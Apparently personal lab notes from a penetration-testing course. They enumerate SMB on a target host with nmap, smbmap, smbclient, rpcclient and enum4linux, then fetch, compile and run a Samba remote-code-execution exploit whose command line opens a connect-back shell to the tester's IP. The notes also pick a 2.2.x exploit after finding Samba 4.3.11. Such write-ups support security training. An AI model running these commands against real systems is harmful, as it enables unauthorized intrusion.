Attack Vector 1 - SMB

# NMAP scans
![048197ce08753b68bc2945869f13a09d.png](120140a80d2e4cc48a2d7fca7eb4d021.png)

![ed9b0966dd6a25448634c97153619d3b.png](0b447ff24c064203bd074366ffcacda5.png)

![822f22275012083e5c3eca9a375eb1a1.png](f9629184c3454cb0a81dba01639814ee.png)

![f16ba99b9d29f66f042556f386438f52.png](835890caa6f04d1293992e7e28b47abf.png)

# searchsploit -m 42084
Doesn't work in Metasploit because no accessible share
![228b415ef0e1da0a6d71e1ef76ba6635.png](01d696045360423eba5abea14675f2a2.png)




SMB Stuff
# Enumerate hostname
`nmblookup -A 10.11.1.101`
![d3057733554a920d5532df0f0d1fa921.png](4b64afbe55364de7920545ad64fda111.png)

# List shares
`smbmap -H 10.11.1.101`
![76232a8367b4ae0840309bcea339c000.png](bf291dfc491040b3949ca6d320f21cc7.png)

`smbmap -H 10.11.1.101 -P 139`
![216573c077382b7a913d271a0feadbb4.png](7400134a73184f9b97d255d63d93342b.png)

`echo exit | smbclient -L \\\\10.11.1.101`
![483b6dc16446af3e507346aa63465dfc.png](49bf8fc50fb94cdaba2387a1f0676771.png)

`sudo nmap --script smb-enum-shares -p 139,445 10.11.1.101`
![abfb9191ceafebe9145b1201c5c8e331.png](893466a6c4bb413392158073192b0e56.png)


# Check Null sessions
`rpcclient -U "" -N 10.11.1.101`
`enumprivs`
![fd1f3f590b4e1955e8f55d2b9eb01e2d.png](e05c84add54349aaa76ce50f3032cf87.png)


`netshareenum`
![f80da5cec657b5ee779c0304bbfd47dc.png](45914e4ae2614dd189645a40c773af98.png)


`srvinfo`
![0db8fc958ba6997d48fdf31de5dceb31.png](b1f2358cfcc742739e2e0e33e54c3f9d.png)

`lookupnames root`
![568ff7951dc6c9fa6a134c95f0e6c20b.png](8d315adf41ad4b75bbdba595881deef2.png)

`lookupsids S-1-22-1-0`
![9e0995b52031e9dbd25f1d6f3e1d1295.png](9326317d78734ce88d83de8583b68d4d.png)

`echo exit | smbclient -L \\\\10.11.1.101\\print$`
![1e59e6a3d700f5ca06f486e81d615588.png](511a80d2900442f59954898ea042fd63.png)

`echo exit | smbclient -L \\\\10.11.1.101\\IPC$`
![c056998c99a6ba6c70d9bd07710872ec.png](9cabf1bde2024ffa91a845c985411793.png)


# Check for Vulnerabilities
`sudo nmap --script smb-vuln* -p 139,445 10.11.1.101`
![f278d12ed390fb6918b858fa80d5caaa.png](6b87aa7c84b8422b95aff57de1ede538.png)

# Overall scan
`enum4linux -a 10.11.1.101`
[enum4linux_output.txt](0065b197ae9a48c78d4d4f9563f6ce30.txt)

`smbclient \\\\10.11.1.101\\IPC$`
![c7d2f7ba16ea4b84d03780d444ef6dca.png](592ff6745c4d4214959965b9ce5c61cd.png)

`smbclient \\\\10.11.1.101\\printer$`
![84c62f935dcab9f6401d197ebcbdaf28.png](4890ddd2b5a94d789bc5dd92a4db87a2.png)


Open Wireshark then run:
`echo exit | smbclient -L 10.11.1.101`

Wireshark output to get the Samba version of TOPHAT: Unix.Samba 4.3.11
![9e2f7d8f88943e08efafb8d145fe26cc.png](3682e18e31f849e2af02560bc23bb07f.png)


Searchsploit
`searchsploit samba remote 2.2`
![d3b3872cc8a2cd1f255ebef677e391a9.png](aed4443062714df4a9f8e9d238dac1ed.png)

Download this one: < 2.2.8 (Linux/BSD) - Remote Code Execution 
`searchsploit -m 10`
![ff0d6aff074141c38cb63a6d06b98404.png](99da056a7e734e6c957bf1a1dacaeaf8.png)

Compile
gcc 10.c -o exploit
![43fbbda259786300a53ca3b63d63ff0f.png](9622280aa41846a1900b7467f490f862.png)

Exploit
`./exploit -b 1 -c 192.168.119.214 -p 139 -v 10.11.1.101`
![b7dcc30e92ad65094867df6fc8ef1d86.png](e277ccb2023249f6b71343eec300037f.png)


